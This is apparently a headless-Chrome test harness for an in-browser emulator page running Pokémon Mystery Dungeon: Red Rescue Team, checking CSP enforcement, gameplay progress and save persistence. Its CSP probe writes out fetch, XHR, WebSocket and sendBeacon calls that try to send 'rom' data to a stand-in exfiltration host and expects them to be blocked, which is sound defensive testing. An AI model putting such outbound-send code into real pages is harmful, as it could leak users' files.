/* Drives the real page in headless Chrome over the DevTools protocol.
 *
 * Exercises the shipping path, not a test-only shortcut: the ROM is handed to
 * the actual <input type=file> via DOM.setFileInputFiles, so the picker, the
 * File API path, the IndexedDB cache and the boot sequence under test are the
 * ones a user gets.
 *
 * Three claims this is here to substantiate, because each is easy to assert
 * falsely:
 *
 *  1. The ROM cannot be uploaded. Checked as *enforcement*, not as absence:
 *     the page is made to attempt a cross-origin fetch/WebSocket/sendBeacon and
 *     the browser must refuse all three under `connect-src 'none'`. Plus the
 *     CDP Network domain's own list of requests, which is ground truth in a way
 *     the page's self-report is not.
 *  2. It genuinely plays. Gated on the decompilation's EWRAM state, not on a
 *     screenshot: this game's opening quiz is screenshot-identical to play.
 *  3. The save survives. Tested two ways -- by dispatching the lifecycle events
 *     by hand and reading the store from the same live page (deterministic, no
 *     race), and then by an actual reload.
 *
 * Audio: asserted off. The page creates no AudioContext unless the mute button
 * is clicked, and this harness never clicks it.
 *
 *   CDP_URL=ws://... node browser-check.mjs <url> <rom path> [outdir]
 */

import { mkdirSync, writeFileSync } from 'node:fs';
import { loadTable, describe } from './gamestate.mjs';
import { quicksave } from './quicksave.mjs';

const baseUrl = process.argv[2];
const romPath = process.argv[3];
const outDir = process.argv[4] || null;
if (!baseUrl || !romPath) {
	console.error('usage: node browser-check.mjs <url> <rom> [outdir]');
	process.exit(2);
}
if (outDir) { mkdirSync(outDir, { recursive: true }); }

const T = loadTable();
const results = [];
function check(name, ok, detail) {
	results.push({ name, ok: !!ok, detail });
	console.log((ok ? 'PASS ' : 'FAIL ') + name + (detail ? '  — ' + detail : ''));
}

/* --------------------------------------------------------------- CDP client */

const endpoint = process.env.CDP_URL;
if (!endpoint) {
	console.error('CDP_URL not set (the websocket URL from /json/new)');
	process.exit(2);
}

const ws = new WebSocket(endpoint);
let nextId = 1;
const pending = new Map();
const consoleErrors = [];
const pageErrors = [];
const cspBlocks = [];
const netRequests = [];
const netFailures = [];
const netResponses = [];

ws.addEventListener('message', (ev) => {
	const msg = JSON.parse(ev.data);
	if (msg.id && pending.has(msg.id)) {
		const { resolve, reject } = pending.get(msg.id);
		pending.delete(msg.id);
		if (msg.error) { reject(new Error(msg.error.message)); } else { resolve(msg.result); }
		return;
	}
	switch (msg.method) {
	case 'Runtime.consoleAPICalled':
		if (msg.params.type === 'error') {
			consoleErrors.push(msg.params.args.map((a) => a.value ?? a.description).join(' '));
		}
		break;
	case 'Runtime.exceptionThrown':
		pageErrors.push(msg.params.exceptionDetails.text + ' ' +
			(msg.params.exceptionDetails.exception?.description || ''));
		break;
	case 'Log.entryAdded': {
		const e = msg.params.entry;
		/* The CSP probe deliberately provokes these. Everything else counts. */
		if (/Content Security Policy|Refused to connect/i.test(e.text)) {
			cspBlocks.push(e.text);
		} else if (e.level === 'error') {
			consoleErrors.push('[' + e.source + '] ' + e.text);
		}
		break;
	}
	case 'Network.requestWillBeSent':
		netRequests.push(msg.params.request.url);
		break;
	case 'Network.loadingFailed':
		netFailures.push({ id: msg.params.requestId, error: msg.params.errorText,
			blockedReason: msg.params.blockedReason || null });
		break;
	case 'Network.responseReceived':
		netResponses.push(msg.params.response.url);
		break;
	default:
		break;
	}
});

function send(method, params = {}) {
	const id = nextId++;
	return new Promise((resolve, reject) => {
		pending.set(id, { resolve, reject });
		ws.send(JSON.stringify({ id, method, params }));
	});
}

await new Promise((res, rej) => {
	ws.addEventListener('open', res);
	ws.addEventListener('error', () => rej(new Error('could not connect to Chrome at ' + endpoint)));
});

async function evalJs(expr, awaitPromise = false) {
	const r = await send('Runtime.evaluate', { expression: expr, returnByValue: true, awaitPromise });
	if (r.exceptionDetails) {
		throw new Error(r.exceptionDetails.text + ' ' +
			(r.exceptionDetails.exception?.description || '') + ' while evaluating: ' + expr);
	}
	return r.result.value;
}

async function waitFor(expr, timeoutMs, label) {
	const t0 = Date.now();
	for (;;) {
		let v = false;
		try { v = await evalJs(expr); } catch { /* page may still be loading */ }
		if (v) { return true; }
		if (Date.now() - t0 > timeoutMs) { throw new Error('timed out waiting for ' + (label || expr)); }
		await new Promise((r) => setTimeout(r, 100));
	}
}

async function shot(tag) {
	if (!outDir) { return; }
	const r = await send('Page.captureScreenshot', { format: 'png' });
	writeFileSync(`${outDir}/${tag}.png`, Buffer.from(r.data, 'base64'));
}

/* A URL nonce the page must echo back. On a shared box this is what proves the
 * tab being measured is the one just navigated, rather than some other tab (or
 * another agent's browser) that happened to answer. */
let nonce = '';
async function navigate(label) {
	nonce = 'n' + Math.random().toString(36).slice(2) + Date.now().toString(36);
	await send('Page.navigate', { url: baseUrl + '?_n=' + nonce });
	await waitFor(`document.readyState === "complete" && location.search.indexOf("${nonce}") !== -1`,
		30000, 'navigation (' + label + ') to echo back its nonce');
	return nonce;
}

/* Runs the page's own state machine in slices, so no single Runtime.evaluate
 * runs long enough to look like a hang. Returns the game state after each. */
const RD = `{
  u8: (a) => window.__vj.read8(a), u16: (a) => window.__vj.read16(a),
  u32: (a) => window.__vj.read32(a), s16: (a) => window.__vj.readS16(a)
}`;

async function pageState() {
	const raw = await evalJs(`JSON.stringify({
		d: window.__vj.read32(${T.symbols.gDungeon}),
		q: window.__vj.read32(${T.symbols.sPersonalityTestTracker}),
		f: window.__vj.read32(${T.symbols.gDungeonFramesCounter})
	})`);
	/* Read the full struct only when there is a dungeon to read. Each field is a
	 * round trip, so this keeps the common case cheap. */
	const quick = JSON.parse(raw);
	if (!quick.d) {
		return {
			dungeonPtr: 0, quizPtr: quick.q >>> 0, dungeonFrames: quick.f >>> 0,
			inQuiz: quick.q !== 0, inDungeonRun: false,
			leader: null, floor: null, dungeonId: null, plausible: false
		};
	}
	const fields = await evalJs(`(function () {
		const rd = ${RD};
		const T = ${JSON.stringify(T)};
		const d = rd.u32(T.symbols.gDungeon) >>> 0, O = T.offsets;
		const e = d + O.teamPokemonEntities;
		return JSON.stringify({
			dungeonPtr: d,
			quizPtr: rd.u32(T.symbols.sPersonalityTestTracker) >>> 0,
			dungeonFrames: rd.u32(T.symbols.gDungeonFramesCounter) >>> 0,
			dungeonId: rd.u8(d + O.location), floor: rd.u8(d + O.location + 1),
			type: rd.u32(e + O.entityType) >>> 0,
			x: rd.s16(e + O.entityPos), y: rd.s16(e + O.entityPos + 2),
			prevX: rd.s16(e + O.entityPrevPos), prevY: rd.s16(e + O.entityPrevPos + 2),
			visible: rd.u8(e + O.entityVisible), room: rd.u8(e + O.entityRoom),
			spawnGenID: rd.u16(e + O.entitySpawnGenID),
			leaderPtr: rd.u32(d + O.teamPokemonPtrs) >>> 0,
			noActionInProgress: rd.u8(d + O.noActionInProgress)
		});
	})()`);
	const f = JSON.parse(fields);
	const C = T.constants;
	const st = {
		dungeonPtr: f.dungeonPtr, quizPtr: f.quizPtr, dungeonFrames: f.dungeonFrames,
		inQuiz: f.quizPtr !== 0, inDungeonRun: true,
		dungeonId: f.dungeonId, floor: f.floor,
		leader: { type: f.type, x: f.x, y: f.y, prevX: f.prevX, prevY: f.prevY,
			visible: f.visible, room: f.room, spawnGenID: f.spawnGenID },
		leaderPtr: f.leaderPtr, noActionInProgress: f.noActionInProgress
	};
	st.plausible = st.leader.type === C.ENTITY_MONSTER &&
		st.leader.x >= 0 && st.leader.x < C.DUNGEON_MAX_SIZE_X &&
		st.leader.y >= 0 && st.leader.y < C.DUNGEON_MAX_SIZE_Y &&
		st.leader.spawnGenID >= 10 && st.leaderPtr === f.dungeonPtr + T.offsets.teamPokemonEntities &&
		st.floor >= 1 && st.floor <= 99;
	return st;
}

/* ------------------------------------------------------------------ the run */

try {
	await send('Page.enable');
	await send('Runtime.enable');
	await send('DOM.enable');
	await send('Log.enable');
	await send('Network.enable');

	// Start from a clean profile state, so "persists across reload" means
	// something: anything found later was written by this run.
	await navigate('first load');
	await evalJs('indexedDB.deleteDatabase("pmdred-web"), true');
	netRequests.length = 0;
	await navigate('reload after db wipe');

	await waitFor('!!(window.__vj && window.__vj.ready)', 60000, 'wasm core init');
	check('core initialises in the browser', true, 'nonce ' + nonce + ' echoed back by the page');

	// ---- the security boundary, as enforcement rather than as a promise -----
	const csp = await evalJs(
		'(document.querySelector(\'meta[http-equiv="Content-Security-Policy"]\')||{}).content || ""');
	check('page ships a CSP with connect-src \'none\'',
		/connect-src\s+'none'/.test(csp) && /default-src\s+'none'/.test(csp),
		csp.replace(/\s+/g, ' ').trim());

	/* The probe. Every one of these is an outbound channel that could carry a
	 * 32 MB ROM somewhere, and each needs its own treatment: fetch rejects,
	 * XHR fires an error event rather than throwing, WebSocket fails
	 * asynchronously, and sendBeacon's return value is NOT a reliable signal --
	 * Chrome can return true for a beacon the CSP layer then refuses. So the
	 * authoritative evidence is the securitypolicyviolation events plus the
	 * network layer, and the per-channel outcomes are a cross-check. */
	const PROBE_HOST = 'https://pmdred-exfil.invalid';
	const probe = await evalJs(`(async () => {
		const U = '${PROBE_HOST}/probe';
		const out = { fetch: null, xhr: null, ws: null, beacon: null, violations: [] };
		document.addEventListener('securitypolicyviolation',
			(e) => out.violations.push(e.effectiveDirective + ' <- ' + e.blockedURI));
		const settle = (p, ms) => Promise.race([p,
			new Promise((r) => setTimeout(() => r('no outcome within ' + ms + 'ms'), ms))]);

		out.fetch = await settle(fetch(U, { method: 'POST', body: 'rom' })
			.then(() => 'ALLOWED').catch((e) => 'blocked: ' + e.name), 3000);

		out.xhr = await settle(new Promise((res) => {
			const x = new XMLHttpRequest();
			x.open('POST', U);
			x.onload = () => res('ALLOWED status ' + x.status);
			x.onerror = () => res('blocked: error event');
			try { x.send('rom'); } catch (e) { res('blocked: ' + e.name); }
		}), 3000);

		out.ws = await settle(new Promise((res) => {
			let s;
			try { s = new WebSocket('${PROBE_HOST.replace('https', 'wss')}/probe'); }
			catch (e) { return res('blocked: ' + e.name); }
			s.onopen = () => res('ALLOWED');
			s.onerror = () => res('blocked: error event');
		}), 3000);

		try { out.beacon = 'sendBeacon returned ' + navigator.sendBeacon(U, 'rom'); }
		catch (e) { out.beacon = 'blocked: ' + e.name; }

		await new Promise((r) => setTimeout(r, 600));
		return JSON.stringify(out);
	})()`, true);
	const P = JSON.parse(probe);
	check('no outbound channel reports success under connect-src \'none\'',
		!/ALLOWED/.test(P.fetch + P.xhr + P.ws),
		`fetch=${P.fetch}; xhr=${P.xhr}; ws=${P.ws}; beacon=${P.beacon}`);
	check('the browser raised a CSP violation for every attempt',
		P.violations.length >= 4, P.violations.join(' | ') || 'none');
	const probeResponses = netResponses.filter((u) => u.includes('pmdred-exfil'));
	const blockedByCsp = netFailures.filter((f) => f.blockedReason === 'csp' ||
		/ERR_BLOCKED_BY_CSP/.test(f.error || ''));
	check('the network layer refused the probe requests outright',
		probeResponses.length === 0 && blockedByCsp.length > 0,
		`${blockedByCsp.length} requests failed with a CSP block, ` +
		`${probeResponses.length} got a response`);

	// ---- the ROM, through the real picker --------------------------------
	const doc = await send('DOM.getDocument');
	const node = await send('DOM.querySelector', { nodeId: doc.root.nodeId, selector: '#rom-file' });
	if (!node.nodeId) { throw new Error('#rom-file not found in the page'); }
	await send('DOM.setFileInputFiles', { nodeId: node.nodeId, files: [romPath] });

	await waitFor('!!(window.__vj && window.__vj.running)', 120000, 'ROM to boot');
	const title = await evalJs('window.__vj.title()');
	const rev = await evalJs('window.__vj.revision()');
	const size = await evalJs('window.__vj.romSize()');
	check('ROM accepted through the file picker', /^POKE DUNGEON/.test(title) && /B24E$/.test(title),
		`title="${title}" rev=${rev} size=${size}`);
	check('ROM is the 32 MB Red Rescue Team image', size === 33554432, size + ' bytes');

	// Ground truth from the network layer, not the page's own report.
	const origin = new URL(baseUrl).origin;
	const foreign = netRequests.filter((u) => !u.startsWith(origin) && !u.includes('pmdred-exfil'));
	const paths = [...new Set(netRequests.map((u) => u.replace(origin, '').split('?')[0]))];
	check('no cross-origin request of any kind (CDP network log)', foreign.length === 0,
		foreign.length ? foreign.join(', ')
			: `${netRequests.length} requests (incl. the deliberate probe), everything else is ${origin}: ${paths.filter((u) => !u.startsWith('http')).join(' ')}`);
	check('page loads no .wasm file (wasm is inlined, so nothing is fetched)',
		!netRequests.some((u) => /\.wasm($|\?)/.test(u)),
		paths.filter((u) => !u.startsWith('http')).join(' '));

	await shot('01-booted');

	// ---- play, muted, gated on the game's own state ----------------------
	const KEY = { A: 1, B: 2, START: 8, RIGHT: 16, LEFT: 32, UP: 64, DOWN: 128 };
	const ROTATION = [KEY.A, KEY.A, KEY.A, KEY.START, KEY.A, KEY.A, KEY.B, KEY.A,
	                  KEY.DOWN, KEY.A, KEY.RIGHT, KEY.A, KEY.START, KEY.A, KEY.UP, KEY.A];
	let rotIdx = 0, stalls = 0, lastHash = 0, sawQuiz = false, dungeonAt = -1, st = null;
	let prevDesc = '';
	const t0 = Date.now();

	while (Date.now() - t0 < 600000) {
		/* ~1000 frames per round trip: short enough that a stuck core shows up
		 * as a stalled loop rather than a dead evaluate. */
		await evalJs(`(function () {
			const R = ${JSON.stringify(ROTATION)};
			let i = ${rotIdx};
			for (let k = 0; k < 60; k++) {
				window.__vj.pump(6, R[i % R.length]);
				window.__vj.pump(10, 0);
				i++;
			}
			return true;
		})()`);
		const h = await evalJs('window.__vj.frameHash()');
		stalls = (h === lastHash) ? stalls + 1 : 0;
		lastHash = h;
		rotIdx += (stalls > 1) ? 180 : 60;
		st = await pageState();
		const d = describe(st);
		if (d !== prevDesc) { prevDesc = d; console.log(`  [${await evalJs('window.__vj.frames')} frames] ${d}`); }
		if (st.inQuiz) { sawQuiz = true; }
		if (st.inDungeonRun && st.plausible) { dungeonAt = await evalJs('window.__vj.frames'); break; }
	}

	check('reached the personality quiz', sawQuiz, 'sPersonalityTestTracker became non-NULL');
	check('reached a running dungeon (past the quiz)', dungeonAt > 0,
		dungeonAt > 0 ? `at frame ${dungeonAt}: ${describe(st)}` : 'never got there: ' + prevDesc);
	await shot('02-dungeon-entry');

	let moves = 0, distinct = 0, endState = st;
	if (dungeonAt > 0) {
		// Clear the floor banner and the partner's tutorial dialogue: those need
		// A presses, not waiting.
		for (let i = 0; i < 40; i++) {
			await evalJs('window.__vj.pump(6,1), window.__vj.pump(12,0), true');
			const s = await pageState();
			if (s.noActionInProgress === 1) { break; }
		}
		await shot('03-dungeon-settled');

		const start = await pageState();
		const seen = new Set([`${start.leader.x},${start.leader.y}`]);
		let lastXY = `${start.leader.x},${start.leader.y}`;
		const DIRS = [KEY.RIGHT, KEY.LEFT, KEY.UP, KEY.DOWN, KEY.RIGHT | KEY.UP, KEY.LEFT | KEY.DOWN];
		for (let i = 0; i < 120; i++) {
			const bits = DIRS[Math.floor(i / 8) % DIRS.length];
			await evalJs(`(function(){ if (${i} % 9 === 8) { window.__vj.pump(6,1); window.__vj.pump(8,0); }
				window.__vj.pump(16, ${bits}); window.__vj.pump(8, 0); return true; })()`);
			const s = await pageState();
			if (!s.inDungeonRun || !s.plausible) { endState = s; break; }
			endState = s;
			const xy = `${s.leader.x},${s.leader.y}`;
			if (xy !== lastXY) { moves++; lastXY = xy; seen.add(xy); }
			if (moves >= 12 && seen.size >= 8) { break; }
		}
		distinct = seen.size;
		check('party leader moves on the dungeon grid', moves >= 4 && distinct >= 4,
			`${moves} position changes over ${distinct} distinct squares; ${describe(endState)}`);
	} else {
		check('party leader moves on the dungeon grid', false, 'never reached a dungeon');
	}
	await shot('04-after-walking');

	const frames = await evalJs('window.__vj.frames');
	const luma = await evalJs('window.__vj.meanLuma()');
	check('canvas is not black', luma > 1.0, `mean luma ${Number(luma).toFixed(2)} after ${frames} frames`);

	const h1 = await evalJs('window.__vj.frameHash()');
	await evalJs('window.__vj.pump(180, 0), true');
	const h2 = await evalJs('window.__vj.frameHash()');
	check('picture advances (core not wedged)', h1 !== h2, `hash ${h1} -> ${h2}`);

	const audioOn = await evalJs('window.__vj.audioOn()');
	const acExists = await evalJs('window.__vj.audioContextExists()');
	check('audio is muted (no AudioContext was ever constructed)',
		audioOn === false && acExists === false, `audioOn=${audioOn} audioContext=${acExists}`);

	// ---- savestates ------------------------------------------------------
	await evalJs('window.__vj.pump(120, 0), true');
	const sHash = await evalJs('window.__vj.frameHash()');
	await evalJs('window.__vj.saveState()', true);
	await evalJs('window.__vj.pump(300, 128), true');
	const divergedHash = await evalJs('window.__vj.frameHash()');
	const loadedOk = await evalJs('window.__vj.loadState()', true);
	await evalJs('window.__vj.pump(1, 0), true');
	const restoredHash = await evalJs('window.__vj.frameHash()');
	if (divergedHash === sHash) {
		check('savestate round trip', false, 'INCONCLUSIVE: picture never changed during divergence');
	} else {
		check('savestate round trip', !!loadedOk && restoredHash !== divergedHash,
			`snapshot=${sHash} diverged=${divergedHash} restored=${restoredHash}`);
	}

	// ---- the game's own save path ----------------------------------------
	// Up to here the cartridge image only holds whatever the game wrote by
	// itself. Driving the in-game Quicksave makes "a save survives a reload" a
	// claim about a save a player could actually have made.
	const writtenBefore = await evalJs('window.__vj.saveWritten()');
	const qs = await quicksave({
		pump: (n, bits) => evalJs(`window.__vj.pump(${n}, ${bits}), true`),
		s16: (a) => evalJs(`window.__vj.readS16(${a})`),
		u32: (a) => evalJs(`window.__vj.read32(${a})`),
		shot: (tag) => shot('qs-' + tag)
	}, T, (m) => console.log(m));
	const writtenAfter = await evalJs('window.__vj.saveWritten()');
	check('drove the in-game Quicksave to completion', qs.ok,
		`${qs.where}; flash written bytes ${writtenBefore} -> ${writtenAfter}`);
	check('the Quicksave wrote a real save into cartridge flash',
		writtenAfter > 1000 && writtenAfter > writtenBefore,
		`${writtenAfter} of 131072 bytes are neither 0x00 nor 0xFF`);
	await shot('06-after-quicksave');

	// ---- does that save reach storage, and survive -----------------------
	await evalJs('window.__vj.flushSave()', true);
	const liveHash = await evalJs('window.__vj.saveHash()');
	const live = await evalJs('JSON.stringify(window.__vj.readSaveBytes(64))');
	const stored = await evalJs('window.__vj.idbSaveBytes(64).then(JSON.stringify)', true);
	const storedLen = await evalJs('window.__vj.idbSaveLength()', true);
	check('the cartridge save reaches IndexedDB', stored === live && storedLen === 131072,
		`${storedLen} bytes stored under "${await evalJs('window.__vj.saveKey()')}"`);

	// The dispatch method, taken from the pokefirered agent's
	// tools/save_mechanism.py: fire the lifecycle events by hand on a live page
	// and read the store from that same page. A reload-soak measures the
	// user-visible outcome but races the page's death, and can pass 8/8 times on
	// a page that is in fact destroying the save. This isolates the mechanism
	// and is deterministic. (The specific failure it is modelled on -- the
	// EmulatorJS beforeunload -> exit handler emptying the store -- cannot arise
	// here, because nothing in this page's unload path does anything but write.)
	await evalJs('window.dispatchEvent(new Event("pagehide")), true');
	await new Promise((r) => setTimeout(r, 1500));
	const afterPagehide = await evalJs('window.__vj.idbSaveBytes(64).then(JSON.stringify)', true);
	const keysAfter = await evalJs('window.__vj.idbKeys().then(JSON.stringify)', true);
	check('dispatching pagehide leaves the save store intact',
		afterPagehide === live, `keys after pagehide: ${keysAfter}`);

	await evalJs(`(function(){ Object.defineProperty(document, 'visibilityState',
		{ configurable: true, get: () => 'hidden' });
		document.dispatchEvent(new Event('visibilitychange')); return true; })()`);
	await new Promise((r) => setTimeout(r, 1500));
	const afterHidden = await evalJs('window.__vj.idbSaveBytes(64).then(JSON.stringify)', true);
	check('dispatching visibilitychange(hidden) leaves the save store intact',
		afterHidden === live, afterHidden === live ? 'unchanged' : 'bytes changed: ' + afterHidden);

	// And the user-visible outcome: an actual reload.
	await navigate('reload');
	await waitFor('!!(window.__vj && window.__vj.ready)', 60000, 'core init after reload');
	await waitFor('!!(window.__vj && window.__vj.running)', 120000, 'resume from cached ROM');
	check('ROM resumes from the local cache after a real reload (no re-pick)', true,
		'nonce ' + nonce + ' echoed back');

	const afterReload = await evalJs('JSON.stringify(window.__vj.readSaveBytes(64))');
	const afterReloadHash = await evalJs('window.__vj.saveHash()');
	const afterReloadWritten = await evalJs('window.__vj.saveWritten()');
	check('the in-game Quicksave survives a real reload',
		afterReload === live && afterReloadHash === liveHash && afterReloadWritten === writtenAfter,
		`all 131072 bytes hash ${liveHash} -> ${afterReloadHash}; ` +
		`${afterReloadWritten} written bytes restored`);
	await shot('07-after-reload');

	// ---- and is the restored save usable? --------------------------------
	// The strongest form of "the save survived": resume from it. A boot with no
	// save data forces the personality quiz; resuming a Quicksave drops straight
	// back into the dungeon. So: drive the opening again and assert the game
	// re-enters a dungeon WITHOUT the quiz ever appearing.
	let resumedAt = -1, quizAgain = false, rst = null, rotB = 0, prevB = '';
	const tResume = Date.now();
	while (Date.now() - tResume < 240000) {
		await evalJs(`(function () {
			const R = ${JSON.stringify(ROTATION)};
			let i = ${rotB};
			for (let k = 0; k < 40; k++) {
				window.__vj.pump(6, R[i % R.length]);
				window.__vj.pump(10, 0);
				i++;
			}
			return true;
		})()`);
		rotB += 40;
		rst = await pageState();
		const d = describe(rst);
		if (d !== prevB) { prevB = d; console.log(`  [resume] ${d}`); }
		if (rst.inQuiz) { quizAgain = true; }
		if (rst.inDungeonRun && rst.plausible) { resumedAt = await evalJs('window.__vj.frames'); break; }
	}
	check('the restored Quicksave resumes into the dungeon, with no new quiz',
		resumedAt > 0 && !quizAgain,
		resumedAt > 0
			? `${describe(rst)}; personality quiz seen again: ${quizAgain}`
			: 'never re-entered a dungeon: ' + prevB);
	await shot('08-resumed-from-save');

	check('no uncaught page errors', pageErrors.length === 0, pageErrors.join(' | ') || 'none');
	check('no console errors beyond the deliberate CSP refusals',
		consoleErrors.length === 0,
		(consoleErrors.join(' | ') || 'none') + `; ${cspBlocks.length} CSP refusals (expected, from the probe)`);

} catch (e) {
	check('harness completed', false, e.message);
	if (pageErrors.length) { console.log('page errors: ' + pageErrors.join(' | ')); }
} finally {
	const failed = results.filter((r) => !r.ok);
	console.log('\n' + (results.length - failed.length) + '/' + results.length + ' checks passed');
	if (outDir) {
		writeFileSync(outDir + '/results.json', JSON.stringify(
			{ results, cspBlocks, netRequests: [...new Set(netRequests)] }, null, 2));
	}
	ws.close();
	process.exit(failed.length ? 1 : 0);
}
